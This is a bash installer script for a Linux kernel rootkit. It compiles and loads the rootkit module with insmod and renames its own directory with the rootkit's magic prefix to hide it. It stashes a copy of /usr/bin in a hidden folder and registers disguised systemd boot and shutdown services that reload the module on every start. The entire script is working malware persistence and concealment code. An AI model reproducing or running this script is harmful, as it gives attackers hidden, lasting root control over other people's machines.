#!/bin/bash

makeImmutable=true

make

koFile=$(ls *.ko)
hFile=$(ls *.h)
if test -f "$koFile"; then
    
    # Load the rootkit's kernel module:
    insmod "$koFile"
    echo "Loaded."

    # Hide current directory via the MAGIC_PREFIX:
    magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
    thisDirPath=$(pwd)
    thisDir=${PWD##*/}
    mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
    cd '../'"$magicPrefix""$thisDir"
    thisDirPath=$(pwd)
    echo "Hidden."

    # Copy all commands in /usr/bin to trove dir
    trovePath="$thisDirPath/$magicPrefix""trove"
    if $makeImmutable; then
        mkdir "$trovePath"
        cp -r /usr/bin/* "$trovePath"
        $trovePath"/echo" "Trove."
    fi

    # Boot script:
    touch boot.sh
    chmod +x boot.sh
    echo "#!/bin/bash" >> boot.sh
    echo "insmod $thisDirPath/$koFile" >> boot.sh
    if $makeImmutable; then
        echo "$trovePath/chmod +x /usr/bin/*" >> boot.sh
    fi
    bootPath="$thisDirPath/boot.sh"
    bootServicePath="/etc/systemd/system/""$magicPrefix""load.service"
    touch $bootServicePath
    echo "[Unit]" >> "$bootServicePath"
    echo "Description=Joe Mamma" >> "$bootServicePath"
    echo "After=multi-user.target" >> "$bootServicePath"
    echo "" >> "$bootServicePath"
    echo "[Service]" >> "$bootServicePath"
    echo "Type=simple" >> "$bootServicePath"
    echo "RemainAfterExit=yes" >> "$bootServicePath"
    echo "ExecStart=$bootPath" >> "$bootServicePath"
    echo "TimeoutStartSec=0" >> "$bootServicePath"
    echo "" >> "$bootServicePath"
    echo "[Install]" >> "$bootServicePath"
    echo "WantedBy=default.target" >> "$bootServicePath" 
    systemctl daemon-reload
    systemctl enable "$bootServicePath"
    echo "Boot."

    # Shutdown script:
    if $makeImmutable; then
        touch shutdown.sh
        chmod +x shutdown.sh
        echo "#!/+bin/bash" >> shutdown.sh
        echo "$trovePath/chmod +x /usr/bin/*" >> shutdown.sh
        shutdownPath="$thisDirPath/shutdown.sh"
        shutdownServicePath="/etc/systemd/system/""$magicPrefix""shutdown.service"
        touch $shutdownServicePath
        echo "[Unit]" >> "$shutdownServicePath"
        echo "Description=Joe Mamma" >> "$shutdownServicePath"
        echo "DefaultDependencies=no" >> "$shutdownServicePath"
        echo "Before=shutdown.target" >> "$shutdownServicePath"
        echo "" >> "$shutdownServicePath"
        echo "[Service]" >> "$shutdownServicePath"
        echo "Type=oneshot" >> "$shutdownServicePath"
        echo "ExecStart=$shutdownPath" >> "$shutdownServicePath"
        echo "TimeoutStartSec=0" >> "$shutdownServicePath"
        echo "" >> "$shutdownServicePath"
        echo "[Install]" >> "$shutdownServicePath"
        echo "WantedBy=shutdown.target" >> "$shutdownServicePath" 
        systemctl daemon-reload
        systemctl enable "$shutdownServicePath"
    fi

    echo "Built."
fi